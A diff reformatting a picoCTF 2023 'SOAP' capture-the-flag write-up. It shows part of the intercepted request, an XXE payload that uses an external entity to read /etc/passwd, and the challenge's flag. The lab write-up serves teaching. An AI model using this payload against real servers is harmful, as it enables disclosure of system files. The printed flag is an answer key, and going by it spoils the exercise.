@@ -1,13 +1,31 @@
 # SOAP
-Write-Up by **Mttttt** *2024-06-25*
 
-## Task description
+| Field | Value |
+| --- | --- |
+| Platform | picoCTF 2023 |
+| Category | Web Exploitation |
+| Difficulty | Medium |
+| Date | 2024-06-25 |
+| Author | Mttttt |
+
+## Overview
+
+Assess how the web application processes XML input.
+
+<details>
+<summary>Original challenge description</summary>
+
 The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? [Web Portal](http://saturn.picoctf.net:55688/)
 
 - *Category*: **Web Exploiation**
 - *Difficulty*: **Medium**
 
-## Solution 
+</details>
+
+## Analysis
+
+The XML parser resolved external entities, allowing disclosure of a local file.
+
 Lets capture our request
 ```
 POST /data HTTP/1.1
@@ -40,5 +58,6 @@ Use payload `<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/passwd">`
 </data>
 ```
 
-## Answer
+## Result
+
 `picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}`
